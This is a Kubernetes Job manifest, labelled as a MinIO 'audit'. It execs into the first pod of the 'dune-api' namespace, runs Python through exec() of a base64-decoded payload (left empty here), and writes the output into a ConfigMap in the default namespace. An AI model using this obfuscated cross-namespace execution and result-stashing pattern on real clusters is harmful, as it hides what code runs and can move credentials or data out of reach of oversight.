apiVersion: batch/v1
kind: Job
metadata:
  name: audit-minio-v75
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  activeDeadlineSeconds: 480
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh"]
        args:
        - "-c"
        - >-
          POD=$(kubectl get pod -n dune-api -o jsonpath='{.items[0].metadata.name}');
          echo "POD=$POD";
          RESULT_B64=$(kubectl exec -n dune-api "$POD" --
          python3 -c "exec(__import__('base64').b64decode('').decode())" 2>&1 | tail -1);
          echo "B64_LEN=$(echo -n $RESULT_B64 | wc -c)";
          kubectl patch configmap dune-audit-result4 -n default --type merge
          -p "{\"data\":{\"minio_b64\":\"$RESULT_B64\"}}";
          echo "DONE"